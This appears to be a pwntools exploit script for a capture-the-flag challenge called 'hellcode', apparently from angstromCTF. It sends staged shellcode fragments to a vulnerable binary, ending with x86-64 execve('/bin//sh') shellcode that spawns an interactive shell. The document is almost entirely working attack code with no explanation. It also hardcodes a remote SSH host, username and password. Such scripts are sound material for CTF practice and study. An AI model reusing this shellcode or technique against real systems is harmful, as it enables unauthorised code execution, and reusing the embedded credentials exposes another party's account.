from pwn import *
import time
import sys


def exploit():
    raw_input('wait')
    buf = 'A' * 17
    buf = '\x4c\x89\xe0\x50\x50\x2c\x40\x50\x31\xd2\xb2\x07'
    proc.sendline(buf)
    buf = '\x41\x54\x4c\x8b\x2c\x25\xb0\x20\x60\x00\xc3'
    raw_input('wait')
    proc.sendline(buf)

    buf = '\x4c\x89\xe0\x66\x81\xc7\x00\x20\x57\x57\x2c\x90\x50\x4c\x89\xea'
    raw_input('3 round')
    proc.send(buf)
    shellcode = '\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05'
    buf = shellcode
    raw_input('get shell')
    proc.sendline(buf)
    


if __name__ == '__main__':
    context.arch = 'amd64'
    connect = 'nc localhost port'
    connect = connect.split(' ')
    if len(sys.argv) > 1:
        #proc = remote(connect[1], int(connect[2]))
        s = ssh(host='shell.angstromctf.com', user='team331977', password='cdd5913973ae')
        proc = s.process('/problems/hellcode/hellcode')
    else:
        proc = process(['./hellcode'], env={'LD_LIBRARY_PATH': './'})
    exploit()
    proc.interactive()
